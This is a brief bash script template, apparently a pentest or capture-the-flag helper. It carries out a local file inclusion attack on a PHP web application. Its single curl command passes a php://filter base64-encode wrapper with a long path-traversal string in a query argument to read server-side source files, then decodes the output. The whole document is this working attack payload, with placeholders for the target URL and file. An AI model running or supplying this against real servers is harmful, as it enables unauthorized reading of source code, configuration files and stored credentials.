#!/bin/bash
##-----------------to Change--------------
#   url
#   file
#   arg
#   readable file

curl -s "http://<url>/file.php?arg=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/file.php" | base64 -d 